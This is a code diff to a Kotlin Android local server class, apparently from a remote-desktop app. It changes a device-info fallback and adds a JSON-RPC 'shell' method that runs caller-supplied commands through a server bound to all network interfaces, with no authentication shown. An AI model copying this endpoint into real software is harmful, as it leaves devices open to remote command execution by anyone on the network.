@@ -2,12 +2,15 @@ package com.web3desk.adr
 
 import android.content.Context
 import android.content.Intent
+import android.os.Build
 import android.provider.Settings
 import android.util.Log
+import androidx.annotation.RequiresApi
 import fi.iki.elonen.NanoHTTPD
 import okhttp3.WebSocket
 import org.json.JSONArray
 import org.json.JSONObject
+import java.io.File
 import java.io.InputStream
 
 class LocalServer(private val context: MainActivity, port: Int) : NanoHTTPD("0.0.0.0", port) {
@@ -33,6 +36,7 @@ class LocalServer(private val context: MainActivity, port: Int) : NanoHTTPD("0.0
                 Log.d("WebSocket", "Connected!")
             }
 
+            @RequiresApi(Build.VERSION_CODES.O)
             override fun onMessage(webSocket: WebSocket, text: String) {
                 Log.d("WebSocket", "Received: $text")
                 if (text.isJson()) {
@@ -85,6 +89,7 @@ class LocalServer(private val context: MainActivity, port: Int) : NanoHTTPD("0.0
         return response
     }
 
+    @RequiresApi(Build.VERSION_CODES.O)
     override fun serve(session: IHTTPSession?): Response {
         if (session == null) return newFixedLengthResponse("Session is null")
         if (session.method == Method.OPTIONS) {
@@ -129,6 +134,8 @@ class LocalServer(private val context: MainActivity, port: Int) : NanoHTTPD("0.0
         }
     }
 
+
+    @RequiresApi(Build.VERSION_CODES.O)
     private fun handleJSONRpcRequest(session: IHTTPSession): Response {
         return try {
             val body = HashMap<String, String>()
@@ -164,6 +171,7 @@ class LocalServer(private val context: MainActivity, port: Int) : NanoHTTPD("0.0
         }
     }
 
+    @RequiresApi(Build.VERSION_CODES.O)
     private fun handleMethod(method: String, params: JSONArray): JSONObject {
         return when (method) {
             "deviceInfo" -> {
@@ -172,16 +180,32 @@ class LocalServer(private val context: MainActivity, port: Int) : NanoHTTPD("0.0
                     "http://127.0.0.1:4447/deviceInfo",
                     mapOf("Accept" to "application/json")
                 )
-                try {
-                    // Parse the response string into JSONObject
-                    val jsonResponse = JSONObject(getResponse)
-                    jsonResponse.getJSONObject("result")
-                } catch (e: Exception) {
-                    // Handle JSON parsing error
+                if (getStatus != 200){
+                    var configContent = ""
+                    val configFile = File("/data/local/tmp/config_server.txt")
+                    if (configFile.exists()) {
+                        configContent = configFile.readText().trim()
+                    }
+                    val clientId = context.appInfo().get("clientId");
                     JSONObject().apply {
-                        put("err", "Failed to parse response: ${e.message}")
+                        put("serverUrl",configContent)
+                        put("clientId",clientId)
+                    }
+                }else{
+                    try {
+                        // Parse the response string into JSONObject
+                        val jsonResponse = JSONObject(getResponse)
+                        jsonResponse.getJSONObject("result")
+                    } catch (e: Exception) {
+                        // Handle JSON parsing error
+                        JSONObject().apply {
+                            put("err", "Failed to parse response: ${e.message}")
+                        }
                     }
                 }
+            }
+            "shell" -> {
+                shellExec(params.get(0).toString())
             }
 
             "startMediaProjection" -> {
